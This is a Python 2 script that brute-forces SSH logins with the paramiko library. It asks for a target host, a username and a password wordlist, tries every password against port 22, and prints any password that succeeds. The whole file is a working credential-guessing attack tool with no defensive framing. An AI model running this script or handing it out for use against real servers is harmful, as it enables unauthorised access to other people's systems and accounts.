import paramiko
import sys
import os
import socket
global host, username, line, input_file

line = "\n-------------------------------------------------------\n"

# return 0 if credentials used to connect to SSH server are correct


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    # return 1 if credentials are wrong
    except paramiko.AuthenticationException:
        code = 1
    # return 2 if connection fails
    except socket.error, e:
        code = 2

    ssh.close()
    return code


# collect program information
try:
    # hold target address
    # hold ssh username to be bruteforced
    # hold file path string
    host = raw_input("[*] Enter Target Host Address: ")
    username = raw_input("[*] Enter SSH Username: ")
    input_file = raw_input("[*] Enter SSH Password File: ")

    # check if file exists. If it doesn't, print as follows.
    if os.path.exists(input_file) == False:
        print ("\n[*] File Path Does Not Exist !!!")
        sys.exit(4)
except KeyboardInterrupt:
    print ("\n\n[*] User Requested An Interrupt")
    sys.exit(3)

input_file = open(input_file)

print ""

for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)

        if response == 0:
            print("%s[*] User: %s [*] Pass Found: %s%s" %
                  (line, username, password, line))
            sys.exit(0)
        elif response == 1:
            print("[*] User: %s [*] Pass: %s => Login Incorrect!!! <=" %
                  (username, password))
        elif response == 2:
            print("[*] COnnection Could Not Be Established To Address: %s" % (host))
            sys.exit(2)
    except Exception, e:
        print e,
        pass

input_file.close()
